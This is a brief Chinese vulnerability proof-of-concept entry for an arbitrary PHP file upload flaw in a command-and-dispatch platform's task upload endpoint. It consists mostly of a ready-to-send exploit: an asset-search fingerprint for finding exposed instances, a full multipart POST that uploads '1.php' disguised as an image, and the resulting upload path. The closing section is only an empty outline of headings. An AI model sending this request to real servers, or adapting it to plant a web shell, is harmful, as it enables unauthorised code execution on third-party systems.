# 指挥调度平台task_uploadfile存在任意文件上传漏洞

- **系统**：指挥调度平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="app/structure/departments.php"`
- **请求**：`POST /api/client/task/uploadfile.php HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary25qW4eG1…`　`Cookie: PHPSESSID=403fc14298f14704c52657fc5ff62c71`　`Content-Length: 374`

**请求体 / payload**
```
------WebKitFormBoundary25qW4eG1Jt50iyf7
Content-Disposition: form-data; name="uuid"
1
------WebKitFormBoundary25qW4eG1Jt50iyf7
Content-Disposition: form-data; name="number"
122
------WebKitFormBoundary25qW4eG1Jt50iyf7
Content-Disposition: form-data; name="uploadfile";filename="1.php"
Content-Type: image/jpg
111
------WebKitFormBoundary25qW4eG1Jt50iyf7--

上传文件位置
/upload/task/9cba3789-1c28-4aea-a205-1eb5faa3f477.php
```

**其他**
- 指挥调度平台task\_uploadfile存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 指挥调度平台